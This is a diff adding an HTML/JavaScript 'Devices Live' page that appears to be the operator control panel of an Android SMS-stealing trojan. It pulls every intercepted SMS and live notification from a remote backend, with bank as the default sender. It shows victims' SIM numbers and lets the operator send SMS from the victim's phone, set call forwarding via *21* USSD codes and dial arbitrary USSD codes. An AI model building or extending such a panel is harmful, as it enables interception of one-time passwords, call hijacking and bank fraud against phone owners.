@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Device Details | Devices Live</title>
+  <link rel="icon" type="image/png" href="assets/image/android.png" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet" />
+  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+
+  <style>
+
+   body {
+    font-family: 'Roboto', Arial, sans-serif;
+    background: #f5f5f5;
+    margin: 0;
+    padding: 0;
+    margin-top: 60px;
+}
+    .container{display:flex;justify-content:center;margin-top:25px;}
+    .device-card{background:#fff;border-radius:10px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,0.1);width:90%;max-width:420px;}
+    .unique-id{background:#00a14b;color:#fff;padding:6px 10px;border-radius:6px;display:inline-block;font-weight:bold;font-size:13px;margin-bottom:10px;}
+    .device-header{display:flex;align-items:center;gap:15px;margin-bottom:15px;}
+    .device-img{width:100px;height:190px;background:url('assets/image/android.png') center/contain no-repeat;}
+    .device-info h2{margin:0;font-size:19px;color:#0b6b29;}
+    .device-info p{margin:4px 0;font-size:14px;color:#333;}
+    #status span{font-weight:bold;}
+
+       /* LIVE ANIMATION — WITH CENTER DOT + GLOW */
+.live-anim {
+  position: relative;
+  color: red;
+  font-weight: 700;
+  padding-left: 8px; /* little spacing for dot */
+  animation: liveText 1.6s infinite ease-in-out;
+}
+
+/* Small red dot in center */
+.live-anim::after {
+  content: "";
+  position: absolute;
+  width: 7px;
+  height: 7px;
+  background: red;
+  border-radius: 50%;
+  left: -2px;
+  top: 4px;
+  animation: dotPulse 1.2s infinite ease-in-out;
+}
+
+/* Big glow bubble */
+.live-anim::before {
+  content: "";
+  position: absolute;
+  width: 28px;
+  height: 28px;
+  background: rgba(255, 0, 0, 0.35);
+  border-radius: 50%;
+  left: -10px;
+  top: -4px;
+  z-index: -1;
+  animation: pulseGlow 1.6s infinite ease-out;
+}
+
+/* DOT PULSE */
+@keyframes dotPulse {
+  0% { transform: scale(0.9); opacity: 0.8; }
+  50% { transform: scale(1.15); opacity: 1; }
+  100% { transform: scale(0.9); opacity: 0.8; }
+}
+
+/* BACKGROUND GLOW EXPANSION */
+@keyframes pulseGlow {
+  0% { transform: scale(0.5); opacity: 0.9; }
+  50% { transform: scale(1.0); opacity: 0.5; }
+  100% { transform: scale(1.6); opacity: 0; }
+}
+
+/* TEXT SOFT PULSE */
+@keyframes liveText {
+  0% { transform: scale(1); }
+  50% { transform: scale(1.06); }
+  100% { transform: scale(1); }
+}
+
+
+    /* 🔰 HEADER */
+    .head {
+      background: #fff;
+      color: #0a6b2a;
+      padding: 15px 10px;
+      text-align: center;
+
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+
+      z-index: 1000;
+      border-bottom: none;
+      box-shadow: none;
+    }
+
+    .head h1 {
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+      font-size: 26px;
+      color: #0c6b27;
+      font-weight: 700;
+    }
+
+    .head h1 span {
+      color: red;
+    }
+
+
+    #simInfoBox{
+      margin-top:8px;
+      font-size:14px;
+      color:#0b6b29;
+      line-height:20px;
+    }
+
+    .sms-title {
+  margin-top: 15px;
+  font-size: 16px;
+  font-weight: bold;
+  color: #0a5c22;
+  text-align: center;
+  padding-bottom: 5px;
+  border-bottom: 1px solid #ccc;
+}
+
+
+    .sim-label{font-weight:bold;color:#0a5c22;}
+
+    .btn-group{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin-top:12px;border-top:1px solid #ccc;padding-top:10px;}
+    .btn{background:#f1f1f1;border:1px solid #ccc;border-radius:5px;padding:8px 12px;font-weight:bold;cursor:pointer;transition:0.2s;font-size:13px;}
+    .btn:hover{background:#e5ffe5;border-color:#00a14b;color:#00a14b;}
+
+    .message-card{background:#e8f5e9;border:1px solid #c8e6c9;border-radius:8px;padding:10px;margin-top:10px;font-size:14px;}
+    .message-card small{color:#777;display:block;margin-top:5px;}
+
+    .popup-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);justify-content:center;align-items:center;z-index:999;}
+    .popup-box{background:#fff;padding:20px;border-radius:10px;width:90%;max-width:360px;text-align:center;}
+    .popup-box input,.popup-box textarea,.popup-box select{width:100%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:14px;}
+
+  /* BUTTON ROW */
+.popup-btns {
+  display: flex;
+  justify-content: space-between;
+  gap: 12px;
+  margin-top: 15px;
+}
+
+/* GREEN BUTTON */
+.activate-btn {
+  flex: 1;
+  padding: 11px 0;
+  background: #00a14b;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  font-size: 15.5px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: 0.25s ease;
+  box-shadow: 0 3px 8px rgba(0, 161, 75, 0.25);
+}
+
+.activate-btn:hover {
+  background: #00913f;
+  transform: translateY(-1px);
+}
+
+/* RED BUTTON */
+.deactivate-btn {
+  flex: 1;
+  padding: 11px 0;
+  background: #ff4d4d;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  font-size: 15.5px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: 0.25s ease;
+  box-shadow: 0 3px 8px rgba(255, 77, 77, 0.25);
+}
+
+.deactivate-btn:hover {
+  background: #e64040;
+  transform: translateY(-1px);
+}
+
+/* 📱 MOBILE RESPONSIVE */
+@media (max-width: 480px) {
+  .popup-btns {
+    gap: 10px;
+  }
+
+  .activate-btn,
+  .deactivate-btn {
+    padding: 13px 0;
+    font-size: 16px;
+  }
+}
+
+
+
+    .sub-status{
+      font-size:12px;
+      color:#555;
+      margin-top:4px;
+    }
+  </style>
+
+<header class="head">
+  <h1>
+   Devices<span class="live-anim">Live</span>
+  </h1>
+</header>
+
+</head>
+
+<body>
+
+<div class="container">
+  <div class="device-card">
+
+    <div class="unique-id" id="uniqueDisplay">Unique ID: -</div>
+
+    <div class="device-header">
+      <div class="device-img"></div>
+
+      <div class="device-info">
+        <h2 id="deviceName">Loading...</h2>
+
+        <div id="simInfoBox">Loading SIM info...</div>
+
+        <p><b>Status:</b> 
+          <span id="status">
+            <span style="color:gray;">Loading...</span>
+          </span>
+        </p>
+
+        <!-- ⭐ CALL FORWARD STATUS TEXT -->
+        <p class="sub-status" id="callStatusText">Call Forward: Loading...</p>
+      </div>
+    </div>
+
+    <div class="btn-group">
+      <button class="btn" id="homeBtn">Home</button>
+      <button class="btn" id="sendSmsBtn">Send SMS</button>
+      <button class="btn" id="callForwardBtn">Call Forwarding</button>
+      <button class="btn" id="ussdBtn">USSD Dialing</button>
+        <button class="btn" id="dataBtn">Data</button>
+    </div>
+<h3 class="sms-title">📩 All SMS of This Device</h3>
+    <div id="messageContainer"></div>
+
+  </div>
+</div>
+
+<!-- POPUP CALL FORWARD -->
+<div class="popup-overlay" id="callPopup">
+  <div class="popup-box">
+    <h3>Call Forwarding</h3>
+    <div id="simInfoCall" style="font-size:13px;margin-bottom:8px;"></div>
+    <select id="simSlotCall">
+      <option value="0">Use SIM 1</option>
+      <option value="1">Use SIM 2</option>
+    </select>
+
+    <input type="text" id="forwardNum" placeholder="Enter number to forward to" />
+
+    <div class="popup-btns">
+      <button class="activate-btn" id="activateCall">Activate</button>
+      <button class="deactivate-btn" id="deactivateCall">Deactivate</button>
+    </div>
+  </div>
+</div>
+
+<!-- POPUP SMS -->
+<div class="popup-overlay" id="smsPopup">
+  <div class="popup-box">
+    <h3>Send SMS</h3>
+    <div id="simInfoSms" style="font-size:13px;margin-bottom:8px;"></div>
+    <select id="simSlotSms">
+      <option value="0">Use SIM 1</option>
+      <option value="1">Use SIM 2</option>
+    </select>
+
+    <input type="text" id="smsNum" placeholder="Phone number" />
+    <textarea id="smsText" placeholder="Enter message..."></textarea>
+
+    <div class="popup-btns">
+      <button class="activate-btn" id="sendNow">Send</button>
+      <button class="deactivate-btn" id="closeSms">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- POPUP USSD -->
+<div class="popup-overlay" id="ussdPopup">
+  <div class="popup-box">
+    <h3>USSD Dialing</h3>
+    <div id="simInfoUssd" style="font-size:13px;margin-bottom:8px;"></div>
+    <select id="simSlotUssd">
+      <option value="0">Use SIM 1</option>
+      <option value="1">Use SIM 2</option>
+    </select>
+
+    <input type="text" id="ussdCode" placeholder="Enter USSD code e.g. *123#" />
+
+    <div class="popup-btns">
+      <button class="activate-btn" id="dialUssd">Send</button>
+      <button class="deactivate-btn" id="closeUssd">Close</button>
+    </div>
+  </div>
+  
+</div>
+
+<script>
+
+// BASE URL (ONLY CHANGE HERE WHEN BACKEND CHANGES)
+const BASE_URL = "https://backend-1-qcsu.onrender.com";
+
+// All API ENDPOINT REFERENCES
+const DEVICE_API   = `${BASE_URL}/api/device`;
+const SIMINFO_API  = `${BASE_URL}/api/siminfo`;
+const SMS_API      = `${BASE_URL}/api/sms`;
+const CALL_API     = `${BASE_URL}/api/call`;
+const MSG_API      = `${BASE_URL}/api/notification`;
+const LASTSEEN_API = `${BASE_URL}/api/lastseen`;
+const SOCKET_URL   = BASE_URL;
+
+// GET DEVICE ID
+const DEVICE_ID = new URLSearchParams(window.location.search).get("id");
+document.getElementById("uniqueDisplay").textContent = `Unique ID: ${DEVICE_ID}`;
+
+const statusEl       = document.getElementById("status");
+const callStatusText = document.getElementById("callStatusText");
+
+// HOME BUTTON
+document.getElementById("homeBtn").onclick = () => {
+    window.location.href = "devices.html";
+};
+
+// FETCH DEVICE DETAILS
+async function fetchDeviceDetails() {
+    try{
+      const r = await fetch(`${DEVICE_API}/${DEVICE_ID}`);
+      const j = await r.json();
+      const d = j.data;
+      document.getElementById("deviceName").textContent = `${d.brand} (${d.model})`;
+    }catch(e){
+      console.error("Device fetch error", e);
+      document.getElementById("deviceName").textContent = "Unknown Device";
+    }
+}
+
+// FETCH SIM INFO
+async function fetchSimInfo() {
+    try {
+        const r = await fetch(`${SIMINFO_API}/${DEVICE_ID}`);
+        const j = await r.json();
+        const s = j.data;
+
+        document.getElementById("simInfoBox").innerHTML = `
+          <span class="sim-label">SIM 1:</span> ${s.sim1Number || "-"}<br>
+          Carrier: ${s.sim1Carrier || "-"}<br><br>
+          <span class="sim-label">SIM 2:</span> ${s.sim2Number || "-"}<br>
+          Carrier: ${s.sim2Carrier || "-"}
+        `;
+
+        const popupText = `
+          SIM 1 - ${s.sim1Number || "-"} (${s.sim1Carrier || "-"})<br>
+          SIM 2 - ${s.sim2Number || "-"} (${s.sim2Carrier || "-"})
+        `;
+
+        document.getElementById("simInfoCall").innerHTML = popupText;
+        document.getElementById("simInfoSms").innerHTML = popupText;
+        document.getElementById("simInfoUssd").innerHTML = popupText;
+
+        // DATA BUTTON
+        document.getElementById("dataBtn").onclick = () => {
+            window.location.href = `data.html?id=${DEVICE_ID}`;
+        };
+
+    } catch (e) {
+        console.error("SIM info error", e);
+        document.getElementById("simInfoBox").innerHTML = "SIM info unavailable";
+    }
+}
+
+// FETCH MESSAGES
+async function fetchMessages() {
+    try {
+        const r = await fetch(`${MSG_API}/${DEVICE_ID}`);
+        const d = await r.json();
+        const list = d.data || [];
+
+        if (!list.length) {
+            document.getElementById("messageContainer").innerHTML = "";
+            return;
+        }
+
+        document.getElementById("messageContainer").innerHTML = list
+            .map(m => `
+                <div class="message-card">
+                    <b>From:</b> ${m.senderNumber}<br>
+                    <b>To:</b> ${m.receiverNumber}<br>
+                    ${m.body}
+                    <small>${new Date(m.timestamp).toLocaleString()}</small>
+                </div>
+            `)
+            .join("");
+
+    } catch (e) {
+        console.error("Messages fetch error", e);
+        document.getElementById("messageContainer").innerHTML = "";
+    }
+}
+
+// LAST SEEN
+async function fetchLastSeen() {
+    try{
+      const r = await fetch(`${LASTSEEN_API}/${DEVICE_ID}`);
+      const j = await r.json();
+      const d = j.data;
+
+      statusEl.innerHTML = `
+        <span style='color:red;'>🔴 OFFLINE</span><br>
+        <small>${d?.updatedAt ? new Date(d.updatedAt).toLocaleString() : ""}</small>
+      `;
+    }catch(e){
+      console.error("Lastseen error", e);
+      statusEl.innerHTML = "<span style='color:red;'>🔴 OFFLINE</span>";
+    }
+}
+
+// CALL FORWARD STATUS
+async function fetchCallStatus() {
+    try {
+        const r = await fetch(`${CALL_API}/${DEVICE_ID}/status`);
+        const j = await r.json();
+
+        if (!j.success || !j.data) {
+            callStatusText.innerHTML = `<span style="font-weight:bold; color:black;">Call Forward: Inactive</span>`;
+            return;
+        }
+
+        const d = j.data;
+        const simText = d.simSlot === 0 ? "SIM 1" : "SIM 2";
+
+        if (d.code === "#21#") {
+            callStatusText.innerHTML = `
+                <span style="font-weight:bold; color:black;">
+                    Call Forward: DEACTIVE
+                </span>`;
+            return;
+        }
+
+        let activeNum = "-";
+        const match = d.code.match(/\*21\*(.*?)#/);
+        if (match) activeNum = match[1];
+
+        callStatusText.innerHTML = `
+            <span style="font-weight:bold; color:green;">
+                Call Forward: ACTIVE → ${activeNum} (${simText})
+            </span>`;
+
+    } catch (e) {
+        console.error("Call status error", e);
+        callStatusText.innerHTML = `
+            <span style="font-weight:bold; color:black;">
+                Call Forward: Error loading status
+            </span>`;
+    }
+}
+
+// POPUP TOGGLE
+function toggle(id, show){ 
+    document.getElementById(id).style.display = show ? "flex" : "none"; 
+}
+
+document.getElementById("sendSmsBtn").onclick    = () => toggle("smsPopup", true);
+document.getElementById("callForwardBtn").onclick= () => toggle("callPopup", true);
+document.getElementById("ussdBtn").onclick       = () => toggle("ussdPopup", true);
+document.getElementById("closeSms").onclick      = () => toggle("smsPopup", false);
+document.getElementById("closeUssd").onclick     = () => toggle("ussdPopup", false);
+
+// SEND SMS
+document.getElementById("sendNow").onclick = async () => {
+    const num = document.getElementById("smsNum").value.trim();
+    const msg = document.getElementById("smsText").value.trim();
+    const sim = Number(document.getElementById("simSlotSms").value);
+
+    if(!num || !msg){
+      return alert("Enter all details");
+    }
+
+    try{
+      const r = await fetch(`${SMS_API}/send/${DEVICE_ID}`,{
+          method:"POST",
+          headers:{ "Content-Type":"application/json" },
+          body:JSON.stringify({ to:num, body:msg, simSlot:sim })
+      });
+
+      const j = await r.json();
+
+      if(!r.ok || !j.success){
+        alert("SMS send failed");
+      }else{
+        alert("SMS queued successfully");
+      }
+
+    }catch(e){
+      console.error("SMS send error", e);
+      alert("SMS send error");
+    }
+
+    toggle("smsPopup", false);
+    fetchMessages();
+};
+
+// ACTIVATE CALL FORWARD
+document.getElementById("activateCall").onclick = async () => {
+    const num = document.getElementById("forwardNum").value.trim();
+    const sim = Number(document.getElementById("simSlotCall").value);
+
+    if(!num) return alert("Enter number");
+
+    const payload = { code: `*21*${num}#`, type: "ussd", simSlot: sim };
+
+    try{
+      const r = await fetch(`${CALL_API}/${DEVICE_ID}/status`,{
+          method:"POST",
+          headers:{ "Content-Type":"application/json" },
+          body:JSON.stringify(payload)
+      });
+
+      const j = await r.json();
+      if(!r.ok || !j.success){
+        alert("Activate call forward failed");
+      }else{
+        alert("Call forward activated");
+      }
+
+    }catch(e){
+      alert("Activate call forward error");
+    }
+
+    toggle("callPopup", false);
+    fetchCallStatus();
+};
+
+// DEACTIVATE CALL FORWARD
+document.getElementById("deactivateCall").onclick = async () => {
+    const sim = Number(document.getElementById("simSlotCall").value);
+
+    const payload = { code: "#21#", type: "ussd", simSlot: sim };
+
+    try{
+      const r = await fetch(`${CALL_API}/${DEVICE_ID}/status`,{
+          method:"POST",
+          headers:{ "Content-Type":"application/json" },
+          body:JSON.stringify(payload)
+      });
+
+      const j = await r.json();
+      if(!r.ok || !j.success){
+        alert("Deactivate call forward failed");
+      }else{
+        alert("Call forward deactivated");
+      }
+
+    }catch(e){
+      alert("Deactivate call forward error");
+    }
+
+    toggle("callPopup", false);
+    fetchCallStatus();
+};
+
+// USSD SEND
+document.getElementById("dialUssd").onclick = async () => {
+    const code = document.getElementById("ussdCode").value.trim();
+    const sim  = Number(document.getElementById("simSlotUssd").value);
+
+    if(!code) return alert("Enter USSD code");
+
+    const payload = { code, type: "ussd", simSlot: sim };
+
+    try{
+      const r = await fetch(`${CALL_API}/${DEVICE_ID}/status`,{
+          method:"POST",
+          headers:{ "Content-Type":"application/json" },
+          body:JSON.stringify(payload)
+      });
+
+      const j = await r.json();
+      if(!r.ok || !j.success){
+        alert("USSD send failed");
+      }else{
+        alert("USSD sent to device");
+      }
+
+    }catch(e){
+      alert("USSD send error");
+    }
+
+    toggle("ussdPopup", false);
+};
+
+// SOCKET LISTENER
+if (window.io) {
+    const socket = io(SOCKET_URL, { transports: ["websocket"] });
+
+    socket.emit("watchDevice", DEVICE_ID);
+
+    socket.on("deviceRealtime", (data) => {
+        if (!data || data.uniqueid !== DEVICE_ID) return;
+
+        if (data.type === "notification") {
+            const msgBox = document.getElementById("messageContainer");
+
+            const html = `
+                <div class="message-card">
+                    <b>From:</b> ${data.senderNumber || "BANK"}<br>
+                    <b>To:</b> ${data.receiverNumber || "-"}<br>
+                    ${data.body}
+                    <small>${new Date(data.timestamp).toLocaleString()}</small>
+                </div>
+            `;
+
+            msgBox.innerHTML = html + msgBox.innerHTML;
+        }
+    });
+
+    socket.on("deviceStatus", data => {
+        if (data.uniqueid === DEVICE_ID) {
+            if (data.connectivity === "Online") {
+                statusEl.innerHTML = "<span style='color:green;'>🟢 ONLINE</span>";
+            } else {
+                fetchLastSeen();
+            }
+        }
+    });
+
+    socket.on("disconnect", () => fetchLastSeen());
+}
+
+// INIT CALLS
+fetchDeviceDetails();
+fetchSimInfo();
+fetchMessages();
+fetchLastSeen();
+fetchCallStatus();
+
+</script>
+</body>
+</html>
